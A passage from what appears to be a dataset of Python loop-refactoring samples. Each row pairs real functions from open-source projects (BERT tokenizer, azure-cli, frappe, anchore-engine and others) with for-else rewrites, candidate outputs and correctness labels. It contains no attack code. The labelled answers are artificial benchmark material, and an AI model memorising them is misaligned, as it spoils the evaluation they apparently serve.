    output_tokens.extend(sub_tokens)","break statement is executed:zejun1
break statement is not executed:None"
bert-for-tf2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bert-for-tf2/bert/tokenization/bert_tokenization.py,https://github.com/kpe/bert-for-tf2/tree/master/bert/tokenization/bert_tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
else:
    is_bad = True
    break",Cannot refactor,-1,"while start < end:
    substr = ''.join(chars[start:end])
    if start > 0:
        substr = '##' + substr
    if substr in self.vocab:
        cur_substr = substr
        break
    end -= 1
if cur_substr is None:
    is_bad = True
    break","break statement is executed:None
break statement is not executed:zejun1"
YouTube-Report,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/YouTube-Report/report.py,https://github.com/A3M4/YouTube-Report/tree/master//report.py,Visualization,wordCloud$124,"def wordCloud(self):
        print(""Generating Word Cloud....."")
        unique_string = ("" "").join(search_clean)
        bg = np.array(Image.open(logo))
        # import nltk.stopwords
        # stopwords.words(""english"")
        english_stopwords = [
            ""i"",
            ""me"",
            ""my"",
            ""myself"",
            ""we"",
            ""our"",
            ""ours"",
            ""ourselves"",
            ""you"",
            ""you're"",
            ""you've"",
            ""you'll"",
            ""you'd"",
            ""your"",
            ""yours"",
            ""yourself"",
            ""yourselves"",
            ""he"",
            ""him"",
            ""his"",
            ""himself"",
            ""she"",
            ""she's"",
            ""her"",
            ""hers"",
            ""herself"",
            ""it"",
            ""it's"",
            ""its"",
            ""itself"",
            ""they"",
            ""them"",
            ""their"",
            ""theirs"",
            ""themselves"",
            ""what"",
            ""which"",
            ""who"",
            ""whom"",
            ""this"",
            ""that"",
            ""that'll"",
            ""these"",
            ""those"",
            ""am"",
            ""is"",
            ""are"",
            ""was"",
            ""were"",
            ""be"",
            ""been"",
            ""being"",
            ""have"",
            ""has"",
            ""had"",
            ""having"",
            ""do"",
            ""does"",
            ""did"",
            ""doing"",
            ""a"",
            ""an"",
            ""the"",
            ""and"",
            ""but"",
            ""if"",
            ""or"",
            ""because"",
            ""as"",
            ""until"",
            ""while"",
            ""of"",
            ""at"",
            ""by"",
            ""for"",
            ""with"",
            ""about"",
            ""against"",
            ""between"",
            ""into"",
            ""through"",
            ""during"",
            ""before"",
            ""after"",
            ""above"",
            ""below"",
            ""to"",
            ""from"",
            ""up"",
            ""down"",
            ""in"",
            ""out"",
            ""on"",
            ""off"",
            ""over"",
            ""under"",
            ""again"",
            ""further"",
            ""then"",
            ""once"",
            ""here"",
            ""there"",
            ""when"",
            ""where"",
            ""why"",
            ""how"",
            ""all"",
            ""any"",
            ""both"",
            ""each"",
            ""few"",
            ""more"",
            ""most"",
            ""other"",
            ""some"",
            ""such"",
            ""no"",
            ""nor"",
            ""not"",
            ""only"",
            ""own"",
            ""same"",
            ""so"",
            ""than"",
            ""too"",
            ""very"",
            ""s"",
            ""t"",
            ""can"",
            ""will"",
            ""just"",
            ""don"",
            ""don't"",
            ""should"",
            ""should've"",
            ""now"",
            ""d"",
            ""ll"",
            ""m"",
            ""o"",
            ""re"",
            ""ve"",
            ""y"",
            ""ain"",
            ""aren"",
            ""aren't"",
            ""couldn"",
            ""couldn't"",
            ""didn"",
            ""didn't"",
            ""doesn"",
            ""doesn't"",
            ""hadn"",
            ""hadn't"",
            ""hasn"",
            ""hasn't"",
            ""haven"",
            ""haven't"",
            ""isn"",
            ""isn't"",
            ""ma"",
            ""mightn"",
            ""mightn't"",
            ""mustn"",
            ""mustn't"",
            ""needn"",
            ""needn't"",
            ""shan"",
            ""shan't"",
            ""shouldn"",
            ""shouldn't"",
            ""wasn"",
            ""wasn't"",
            ""weren"",
            ""weren't"",
            ""won"",
            ""won't"",
            ""wouldn"",
            ""wouldn't"",
        ]

        stop_words = [""porn"", ""nigga"", ""pussy""] + english_stopwords
        found=False
        FONTS=(""LinBiolinum_R"",""Arial"",""arial"",""DejaVuSansMono"")
        for font in FONTS:	#this should fix an error where the font couldn't be found
            try:
                wordcloud = WordCloud(
                    stopwords=stop_words,
                    mask=bg,
                    background_color=""white"",
                    colormap=""Set2"",
                    font_path=font,
                    max_words=380,
                    contour_width=2,
                    prefer_horizontal=1,
                ).generate(unique_string)
            except OSError:
                continue
            else:
                found=True
                break
        if not found:
            raise OSError(""Could not find any of these fonts: %s""%(FONTS))
        del FONTS
        del found
        
        plt.figure()
        plt.imshow(wordcloud)
        plt.axis(""off"")
        # plt.savefig(""your_file_name""+"".png"", bbox_inches=""tight"")
        plt.title(""What Do You Usually Search on YouTube?"",
                  fontsize=18,
                  color=""steelblue"",
                  fontweight=""bold"",
                  fontname=""Comic Sans MS"")

        plt.annotate(""   WordCloud is based on a total of %s search queries""%(str(len(search_clean))),
                     (0, 0), (-10, 10),
                     fontsize=13,
                     color=""steelblue"",
                     fontweight=""bold"",
                     fontname=""Comic Sans MS"",
                     xycoords=""axes fraction"",
                     textcoords=""offset points"",
                     va=""top"")

        plt.savefig(os.path.join(image_dir,""word_cloud.png""), dpi=400)
        plt.clf()","for font in FONTS:
    try:
        wordcloud = WordCloud(stopwords=stop_words, mask=bg, background_color='white', colormap='Set2', font_path=font, max_words=380, contour_width=2, prefer_horizontal=1).generate(unique_string)
    except OSError:
        continue
    else:
        found = True
        break
if not found:
    raise OSError('Could not find any of these fonts: %s' % FONTS)","for font in FONTS:
    try:
        wordcloud = WordCloud(stopwords=stop_words, mask=bg, background_color='white', colormap='Set2', font_path=font, max_words=380, contour_width=2, prefer_horizontal=1).generate(unique_string)
    except OSError:
        continue
    else:
        found = True
        break
else:
    raise OSError('Could not find any of these fonts: %s' % FONTS)","for font in FONTS:
    try:
        wordcloud = WordCloud(stopwords=stop_words, mask=bg, background_color='white', colormap='Set2', font_path=font, max_words=380, contour_width=2, prefer_horizontal=1).generate(unique_string)
    except OSError:
        continue
    else:
        found = True
        break
else:
    raise OSError('Could not find any of these fonts: %s' % FONTS)",1,"for font in FONTS:
    try:
        wordcloud = WordCloud(stopwords=stop_words, mask=bg, background_color='white', colormap='Set2', font_path=font, max_words=380, contour_width=2, prefer_horizontal=1).generate(unique_string)
    except OSError:
        continue
    else:
        found = True
        break
if not found:
    raise OSError('Could not find any of these fonts: %s' % FONTS)","break statement is executed:None
break statement is not executed:zejun1"
whatsapp-framework,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/whatsapp-framework/libs/yowsup/yowsup/yowsup/structs/protocoltreenode.py,https://github.com/danielcardeenas/whatsapp-framework/tree/master/libs/yowsup/yowsup/yowsup/structs/protocoltreenode.py,ProtocolTreeNode,__eq__$13,"def __eq__(self, protocolTreeNode):
        """"""
        :param protocolTreeNode: ProtocolTreeNode
        :return: bool
        """"""
        #
        if protocolTreeNode.__class__ == ProtocolTreeNode\
            and self.tag == protocolTreeNode.tag\
            and self.data == protocolTreeNode.data\
            and self.attributes == protocolTreeNode.attributes\
            and len(self.getAllChildren()) == len(protocolTreeNode.getAllChildren()):
                found = False
                for c in self.getAllChildren():
                    for c2 in protocolTreeNode.getAllChildren():
                        if c == c2:
                            found = True
                            break
                    if not found:
                        return False

                found = False
                for c in protocolTreeNode.getAllChildren():
                    for c2 in self.getAllChildren():
                        if c == c2:
                            found = True
                            break
                    if not found:
                        return False

                return True

        return False","for c2 in protocolTreeNode.getAllChildren():
    if c == c2:
        found = True
        break
if not found:
    return False","for c2 in protocolTreeNode.getAllChildren():
    if c == c2:
        found = True
        break
else:
    return False","for c2 in protocolTreeNode.getAllChildren():
    if c == c2:
        break
else:
    return False",0,"for c2 in protocolTreeNode.getAllChildren():
    if c == c2:
        found = True
        break
if not found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
whatsapp-framework,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/whatsapp-framework/libs/yowsup/yowsup/yowsup/structs/protocoltreenode.py,https://github.com/danielcardeenas/whatsapp-framework/tree/master/libs/yowsup/yowsup/yowsup/structs/protocoltreenode.py,ProtocolTreeNode,__eq__$13,"def __eq__(self, protocolTreeNode):
        """"""
        :param protocolTreeNode: ProtocolTreeNode
        :return: bool
        """"""
        #
        if protocolTreeNode.__class__ == ProtocolTreeNode\
            and self.tag == protocolTreeNode.tag\
            and self.data == protocolTreeNode.data\
            and self.attributes == protocolTreeNode.attributes\
            and len(self.getAllChildren()) == len(protocolTreeNode.getAllChildren()):
                found = False
                for c in self.getAllChildren():
                    for c2 in protocolTreeNode.getAllChildren():
                        if c == c2:
                            found = True
                            break
                    if not found:
                        return False

                found = False
                for c in protocolTreeNode.getAllChildren():
                    for c2 in self.getAllChildren():
                        if c == c2:
                            found = True
                            break
                    if not found:
                        return False

                return True

        return False","for c2 in self.getAllChildren():
    if c == c2:
        found = True
        break
if not found:
    return False","for c2 in self.getAllChildren():
    if c == c2:
        break
else:
    return False","for c2 in self.getAllChildren():
    if c == c2:
        break
else:
    return False",1,"for c2 in self.getAllChildren():
    if c == c2:
        found = True
        break
if not found:
    return False","break statement is executed:None
break statement is not executed:zejun1"
azure-cli,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/azure-cli/src/azure-cli/azure/cli/command_modules/acr/custom.py,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/acr/custom.py,,remove_identity$510,"def remove_identity(cmd, client, registry_name, identities, resource_group_name=None):
    from azure.cli.core.commands.client_factory import get_subscription_id
    remove_system_identity, remove_user_identities = _analyze_identities(identities)
    registry, resource_group_name = get_registry_by_name(cmd.cli_ctx, registry_name, resource_group_name)

    ResourceIdentityType = cmd.get_models('ResourceIdentityType')

    # if registry.identity is not set or is none, return the registry.
    if not registry.identity or registry.identity.type == ResourceIdentityType.none:
        raise CLIError(""The registry {} has no system or user assigned identities."".format(registry_name))

    if remove_system_identity:
        if registry.identity.type.lower() == ResourceIdentityType.user_assigned.lower():
            raise CLIError(""The registry does not have a system identity assigned."")
        registry.identity.type = (ResourceIdentityType.none
                                  if registry.identity.type.lower() == ResourceIdentityType.system_assigned.lower()
                                  else ResourceIdentityType.user_assigned)
        # if we have no system assigned identitiy then set identity object to none
        registry.identity.principal_id = None
        registry.identity.tenant_id = None

    if remove_user_identities:
        subscription_id = get_subscription_id(cmd.cli_ctx)
        registry.identity.user_assigned_identities = registry.identity.user_assigned_identities or {}

        for id_to_remove in remove_user_identities:
            original_identity = id_to_remove
            was_removed = False

            id_to_remove = _ensure_identity_resource_id(subscription_id, resource_group_name, id_to_remove)

            # remove identity if it exists even if case is different
            for existing_identity in registry.identity.user_assigned_identities.copy():
                if existing_identity.lower() == id_to_remove.lower():
                    registry.identity.user_assigned_identities.pop(existing_identity)
                    was_removed = True
                    break

            if not was_removed:
                raise CLIError(""The registry does not have specified user identity '{}' assigned, ""
                               ""so it cannot be removed."".format(original_identity))

        # all user assigned identities are gone
        if not registry.identity.user_assigned_identities:
            registry.identity.user_assigned_identities = None  # required for put
            registry.identity.type = (ResourceIdentityType.none
                                      if registry.identity.type.lower() == ResourceIdentityType.user_assigned.lower()
                                      else ResourceIdentityType.system_assigned)

    # this method should be named create_or_update as it calls the PUT method
    return client.begin_create(resource_group_name, registry_name, registry)","for existing_identity in registry.identity.user_assigned_identities.copy():
    if existing_identity.lower() == id_to_remove.lower():
        registry.identity.user_assigned_identities.pop(existing_identity)
        was_removed = True
        break
if not was_removed:
    raise CLIError(""The registry does not have specified user identity '{}' assigned, so it cannot be removed."".format(original_identity))","for existing_identity in registry.identity.user_assigned_identities.copy():
    if existing_identity.lower() == id_to_remove.lower():
        registry.identity.user_assigned_identities.pop(existing_identity)
        break
else:
    raise CLIError(""The registry does not have specified user identity '{}' assigned, so it cannot be removed."".format(original_identity))","for existing_identity in registry.identity.user_assigned_identities.copy():
    if existing_identity.lower() == id_to_remove.lower():
        registry.identity.user_assigned_identities.pop(existing_identity)
        break
else:
    raise CLIError(""The registry does not have specified user identity '{}' assigned, so it cannot be removed."".format(original_identity))",1,"for existing_identity in registry.identity.user_assigned_identities.copy():
    if existing_identity.lower() == id_to_remove.lower():
        registry.identity.user_assigned_identities.pop(existing_identity)
        was_removed = True
        break
if not was_removed:
    raise CLIError(""The registry does not have specified user identity '{}' assigned, so it cannot be removed."".format(original_identity))","break statement is executed:None
break statement is not executed:zejun1"
anchore-engine,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/anchore-engine/anchore_engine/services/policy_engine/engine/policy/gates/packages.py,https://github.com/anchore/anchore-engine/tree/master/anchore_engine/services/policy_engine/engine/policy/gates/packages.py,RequiredPackageTrigger,evaluate$199,"def evaluate(self, image_obj, context):
        name = self.pkg_name.value()
        version = self.pkg_version.value()
        comparison = self.version_comparison.value(default_if_none=""exact"")

        found = False

        # Filter is possible since the lazy='dynamic' is set on the packages relationship in Image.
        for img_pkg in image_obj.packages.filter(ImagePackage.name == name).all():
            if version is None:
                found = True
                break
            elif comparison == ""exact"":
                if img_pkg.fullversion != version:
                    self._fire(
                        msg=""Required input package (""
                        + str(img_pkg.name)
                        + "") is present (""
                        + str(img_pkg.fullversion)
                        + ""), but not at the version specified in policy (""
                        + str(name)
                        + "")""
                    )

                found = True
                break
            elif comparison == ""minimum"":
                if img_pkg.fullversion != version:
                    # Check if version is less than param value
                    if (
                        compare_package_versions(
                            img_pkg.distro_namespace_meta.flavor,
                            img_pkg.name,
                            img_pkg.version,
                            img_pkg.name,
                            version,
                        )
                        < 0
                    ):
                        self._fire(
                            msg=""Required min-version input package (""
                            + str(img_pkg.name)
                            + "") is present (""
                            + str(img_pkg.fullversion)
                            + ""), but is lower version than what is specified in policy (""
                            + str(version)
                            + "")""
                        )

                # >=, so ok
                found = True
                break

        if not found:
            if version and comparison != ""name_only"":
                self._fire(
                    msg=""Required input package ({},{}) is not present in container image"".format(
                        str(name), str(version)
                    )
                )
            else:
                self._fire(
                    msg=""Required input package ({}) is not present in container image"".format(
                        str(name)
                    )
                )","for img_pkg in image_obj.packages.filter(ImagePackage.name == name).all():
    if version is None:
        found = True
        break
    elif comparison == 'exact':
        if img_pkg.fullversion != version:
            self._fire(msg='Required input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but not at the version specified in policy (' + str(name) + ')')
        found = True
        break
    elif comparison == 'minimum':
        if img_pkg.fullversion != version:
            if compare_package_versions(img_pkg.distro_namespace_meta.flavor, img_pkg.name, img_pkg.version, img_pkg.name, version) < 0:
                self._fire(msg='Required min-version input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but is lower version than what is specified in policy (' + str(version) + ')')
        found = True
        break
if not found:
    if version and comparison != 'name_only':
        self._fire(msg='Required input package ({},{}) is not present in container image'.format(str(name), str(version)))
    else:
        self._fire(msg='Required input package ({}) is not present in container image'.format(str(name)))","for img_pkg in image_obj.packages.filter(ImagePackage.name == name).all():
    if version is None:
        break
    elif comparison == 'exact':
        if img_pkg.fullversion != version:
            self._fire(msg='Required input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but not at the version specified in policy (' + str(name) + ')')
        break
    elif comparison == 'minimum':
        if img_pkg.fullversion != version:
            if compare_package_versions(img_pkg.distro_namespace_meta.flavor, img_pkg.name, img_pkg.version, img_pkg.name, version) < 0:
                self._fire(msg='Required min-version input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but is lower version than what is specified in policy (' + str(version) + ')')
        break
else:
    if version and comparison != 'name_only':
        self._fire(msg='Required input package ({},{}) is not present in container image'.format(str(name), str(version)))
    else:
        self._fire(msg='Required input package ({}) is not present in container image'.format(str(name)))","for img_pkg in image_obj.packages.filter(ImagePackage.name == name).all():
    if version is None:
        break
    elif comparison == 'exact':
        if img_pkg.fullversion != version:
            self._fire(msg='Required input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but not at the version specified in policy (' + str(name) + ')')
        break
    elif comparison == 'minimum':
        if img_pkg.fullversion != version:
            if compare_package_versions(img_pkg.distro_namespace_meta.flavor, img_pkg.name, img_pkg.version, img_pkg.name, version) < 0:
                self._fire(msg='Required min-version input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but is lower version than what is specified in policy (' + str(version) + ')')
        break
else:
    if version and comparison != 'name_only':
        self._fire(msg='Required input package ({},{}) is not present in container image'.format(str(name), str(version)))
    else:
        self._fire(msg='Required input package ({}) is not present in container image'.format(str(name)))",1,"for img_pkg in image_obj.packages.filter(ImagePackage.name == name).all():
    if version is None:
        found = True
        break
    elif comparison == 'exact':
        if img_pkg.fullversion != version:
            self._fire(msg='Required input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but not at the version specified in policy (' + str(name) + ')')
        found = True
        break
    elif comparison == 'minimum':
        if img_pkg.fullversion != version:
            if compare_package_versions(img_pkg.distro_namespace_meta.flavor, img_pkg.name, img_pkg.version, img_pkg.name, version) < 0:
                self._fire(msg='Required min-version input package (' + str(img_pkg.name) + ') is present (' + str(img_pkg.fullversion) + '), but is lower version than what is specified in policy (' + str(version) + ')')
        found = True
        break
if not found:
    if version and comparison != 'name_only':
        self._fire(msg='Required input package ({},{}) is not present in container image'.format(str(name), str(version)))
    else:
        self._fire(msg='Required input package ({}) is not present in container image'.format(str(name)))","break statement is executed:None
break statement is not executed:zejun1"
frappe,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/frappe/frappe/model/document.py,https://github.com/frappe/frappe/tree/master/frappe/model/document.py,Document,apply_fieldlevel_read_permissions$653,"def apply_fieldlevel_read_permissions(self):
		""""""Remove values the user is not allowed to read (called when loading in desk)""""""

		if frappe.session.user == ""Administrator"":
			return

		has_higher_permlevel = False

		all_fields = self.meta.fields.copy()
		for table_field in self.meta.get_table_fields():
			all_fields += frappe.get_meta(table_field.options).fields or []

		for df in all_fields:
			if df.permlevel > 0:
				has_higher_permlevel = True
				break

		if not has_higher_permlevel:
			return

		has_access_to = self.get_permlevel_access(""read"")

		for df in self.meta.fields:
			if df.permlevel and not df.permlevel in has_access_to:
				self.set(df.fieldname, None)

		for table_field in self.meta.get_table_fields():
			for df in frappe.get_meta(table_field.options).fields or []:
				if df.permlevel and not df.permlevel in has_access_to:
					for child in self.get(table_field.fieldname) or []:
						child.set(df.fieldname, None)","for df in all_fields:
    if df.permlevel > 0:
        has_higher_permlevel = True
        break
if not has_higher_permlevel:
    return","for df in all_fields:
    if df.permlevel > 0:
        break
else:
    return","for df in all_fields:
    if df.permlevel > 0:
        break
else:
    return",1,"for df in all_fields:
    if df.permlevel > 0:
        has_higher_permlevel = True
        break
if not has_higher_permlevel:
    return","break statement is executed:None
break statement is not executed:zejun1"
hamster,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/hamster/waflib/Tools/python.py,https://github.com/projecthamster/hamster/tree/master/waflib/Tools/python.py,,check_python_headers$292,"def check_python_headers(conf, features='pyembed pyext'):
	""""""
	Check for headers and libraries necessary to extend or embed python by using the module *distutils*.
	On success the environment variables xxx_PYEXT and xxx_PYEMBED are added:

	* PYEXT: for compiling python extensions
	* PYEMBED: for embedding a python interpreter
	""""""
	features = Utils.to_list(features)
	assert ('pyembed' in features) or ('pyext' in features), ""check_python_headers features must include 'pyembed' and/or 'pyext'""
	env = conf.env
	if not env.CC_NAME and not env.CXX_NAME:
		conf.fatal('load a compiler first (gcc, g++, ..)')

	# bypass all the code below for cross-compilation
	if conf.python_cross_compile(features):
		return

	if not env.PYTHON_VERSION:
		conf.check_python_version()

	pybin = env.PYTHON
	if not pybin:
		conf.fatal('Could not find the python executable')

	# so we actually do all this for compatibility reasons and for obtaining pyext_PATTERN below
	v = 'prefix SO LDFLAGS LIBDIR LIBPL INCLUDEPY Py_ENABLE_SHARED MACOSX_DEPLOYMENT_TARGET LDSHARED CFLAGS LDVERSION'.split()
	try:
		lst = conf.get_python_variables([""get_config_var('%s') or ''"" % x for x in v])
	except RuntimeError:
		conf.fatal(""Python development headers not found (-v for details)."")

	vals = ['%s = %r' % (x, y) for (x, y) in zip(v, lst)]
	conf.to_log(""Configuration returned from %r:\n%s\n"" % (pybin, '\n'.join(vals)))

	dct = dict(zip(v, lst))
	x = 'MACOSX_DEPLOYMENT_TARGET'
	if dct[x]:
		env[x] = conf.environ[x] = dct[x]
	env.pyext_PATTERN = '%s' + dct['SO'] # not a mistake


	# Try to get pythonX.Y-config
	num = '.'.join(env.PYTHON_VERSION.split('.')[:2])
	conf.find_program([''.join(pybin) + '-config', 'python%s-config' % num, 'python-config-%s' % num, 'python%sm-config' % num], var='PYTHON_CONFIG', msg=""python-config"", mandatory=False)

	if env.PYTHON_CONFIG:
		# check python-config output only once
		if conf.env.HAVE_PYTHON_H:
			return

		# python2.6-config requires 3 runs
		all_flags = [['--cflags', '--libs', '--ldflags']]
		if sys.hexversion < 0x2070000:
			all_flags = [[k] for k in all_flags[0]]

		xx = env.CXX_NAME and 'cxx' or 'c'

		if 'pyembed' in features:
			for flags in all_flags:
				# Python 3.8 has different flags for pyembed, needs --embed
				embedflags = flags + ['--embed']
				try:
					conf.check_cfg(msg='Asking python-config for pyembed %r flags' % ' '.join(embedflags), path=env.PYTHON_CONFIG, package='', uselib_store='PYEMBED', args=embedflags)
				except conf.errors.ConfigurationError:
					# However Python < 3.8 doesn't accept --embed, so we need a fallback
					conf.check_cfg(msg='Asking python-config for pyembed %r flags' % ' '.join(flags), path=env.PYTHON_CONFIG, package='', uselib_store='PYEMBED', args=flags)

			try:
				conf.test_pyembed(xx)
			except conf.errors.ConfigurationError:
				# python bug 7352
				if dct['Py_ENABLE_SHARED'] and dct['LIBDIR']:
					env.append_unique('LIBPATH_PYEMBED', [dct['LIBDIR']])
					conf.test_pyembed(xx)
				else:
					raise

		if 'pyext' in features:
			for flags in all_flags:
				conf.check_cfg(msg='Asking python-config for pyext %r flags' % ' '.join(flags), path=env.PYTHON_CONFIG, package='', uselib_store='PYEXT', args=flags)

			try:
				conf.test_pyext(xx)
			except conf.errors.ConfigurationError:
				# python bug 7352
				if dct['Py_ENABLE_SHARED'] and dct['LIBDIR']:
					env.append_unique('LIBPATH_PYEXT', [dct['LIBDIR']])
					conf.test_pyext(xx)
				else:
					raise

		conf.define('HAVE_PYTHON_H', 1)
		return

	# No python-config, do something else on windows systems
	all_flags = dct['LDFLAGS'] + ' ' + dct['CFLAGS']
	conf.parse_flags(all_flags, 'PYEMBED')

	all_flags = dct['LDFLAGS'] + ' ' + dct['LDSHARED'] + ' ' + dct['CFLAGS']
	conf.parse_flags(all_flags, 'PYEXT')

	result = None
	if not dct[""LDVERSION""]:
		dct[""LDVERSION""] = env.PYTHON_VERSION

	# further simplification will be complicated
	for name in ('python' + dct['LDVERSION'], 'python' + env.PYTHON_VERSION + 'm', 'python' + env.PYTHON_VERSION.replace('.', '')):

		# LIBPATH_PYEMBED is already set; see if it works.
		if not result and env.LIBPATH_PYEMBED:
			path = env.LIBPATH_PYEMBED
			conf.to_log(""\n\n# Trying default LIBPATH_PYEMBED: %r\n"" % path)
			result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)

		if not result and dct['LIBDIR']:
			path = [dct['LIBDIR']]
			conf.to_log(""\n\n# try again with -L$python_LIBDIR: %r\n"" % path)
			result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)

		if not result and dct['LIBPL']:
			path = [dct['LIBPL']]
			conf.to_log(""\n\n# try again with -L$python_LIBPL (some systems don't install the python library in $prefix/lib)\n"")
			result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)

		if not result:
			path = [os.path.join(dct['prefix'], ""libs"")]
			conf.to_log(""\n\n# try again with -L$prefix/libs, and pythonXY name rather than pythonX.Y (win32)\n"")
			result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)

		if result:
			break # do not forget to set LIBPATH_PYEMBED

	if result:
		env.LIBPATH_PYEMBED = path
		env.append_value('LIB_PYEMBED', [name])
	else:
		conf.to_log(""\n\n### LIB NOT FOUND\n"")

	# under certain conditions, python extensions must link to
	# python libraries, not just python embedding programs.
	if Utils.is_win32 or dct['Py_ENABLE_SHARED']:
		env.LIBPATH_PYEXT = env.LIBPATH_PYEMBED
		env.LIB_PYEXT = env.LIB_PYEMBED

	conf.to_log(""Include path for Python extensions (found via distutils module): %r\n"" % (dct['INCLUDEPY'],))
	env.INCLUDES_PYEXT = [dct['INCLUDEPY']]
	env.INCLUDES_PYEMBED = [dct['INCLUDEPY']]

	# Code using the Python API needs to be compiled with -fno-strict-aliasing
	if env.CC_NAME == 'gcc':
		env.append_unique('CFLAGS_PYEMBED', ['-fno-strict-aliasing'])
		env.append_unique('CFLAGS_PYEXT', ['-fno-strict-aliasing'])
	if env.CXX_NAME == 'gcc':
		env.append_unique('CXXFLAGS_PYEMBED', ['-fno-strict-aliasing'])
		env.append_unique('CXXFLAGS_PYEXT', ['-fno-strict-aliasing'])

	if env.CC_NAME == ""msvc"":
		from distutils.msvccompiler import MSVCCompiler
		dist_compiler = MSVCCompiler()
		dist_compiler.initialize()
		env.append_value('CFLAGS_PYEXT', dist_compiler.compile_options)
		env.append_value('CXXFLAGS_PYEXT', dist_compiler.compile_options)
		env.append_value('LINKFLAGS_PYEXT', dist_compiler.ldflags_shared)

	# See if it compiles
	conf.check(header_name='Python.h', define_name='HAVE_PYTHON_H', uselib='PYEMBED', fragment=FRAG, errmsg='Distutils not installed? Broken python installation? Get python-config now!')","for name in ('python' + dct['LDVERSION'], 'python' + env.PYTHON_VERSION + 'm', 'python' + env.PYTHON_VERSION.replace('.', '')):
    if not result and env.LIBPATH_PYEMBED:
        path = env.LIBPATH_PYEMBED
        conf.to_log('\n\n# Trying default LIBPATH_PYEMBED: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)
    if not result and dct['LIBDIR']:
        path = [dct['LIBDIR']]
        conf.to_log('\n\n# try again with -L$python_LIBDIR: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)
    if not result and dct['LIBPL']:
        path = [dct['LIBPL']]
        conf.to_log(""\n\n# try again with -L$python_LIBPL (some systems don't install the python library in $prefix/lib)\n"")
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)
    if not result:
        path = [os.path.join(dct['prefix'], 'libs')]
        conf.to_log('\n\n# try again with -L$prefix/libs, and pythonXY name rather than pythonX.Y (win32)\n')
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)
    if result:
        break
if result:
    env.LIBPATH_PYEMBED = path
    env.append_value('LIB_PYEMBED', [name])
else:
    conf.to_log('\n\n### LIB NOT FOUND\n')","for name in ('python' + dct['LDVERSION'], 'python' + env.PYTHON_VERSION + 'm', 'python' + env.PYTHON_VERSION.replace('.', '')):
    if not result and env.LIBPATH_PYEMBED:
        path = env.LIBPATH_PYEMBED
        conf.to_log('\n\n# Trying default LIBPATH_PYEMBED: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBPATH_PYEMBED' % name)
    if not result and dct['LIBDIR']:
        path = [dct['LIBDIR']]
        conf.to_log('\n\n# try again with -L$python_LIBDIR: %r\n' % path)
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in LIBDIR' % name)
    if not result and dct['LIBPL']:
        path = [dct['LIBPL']]
        conf.to_log(""\n\n# try again with -L$python_LIBPL (some systems don't install the python library in $prefix/lib)\n"")
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in python_LIBPL' % name)
    if not result:
        path = [os.path.join(dct['prefix'], 'libs')]
        conf.to_log('\n\n# try again with -L$prefix/libs, and pythonXY name rather than pythonX.Y (win32)\n')
        result = conf.check(lib=name, uselib='PYEMBED', libpath=path, mandatory=False, msg='Checking for library %s in $prefix/libs' % name)
    if result:
        env.LIBPATH_PYEMBED = path
        env.append_value('LIB_PYEMBED', [name])
        break
else:
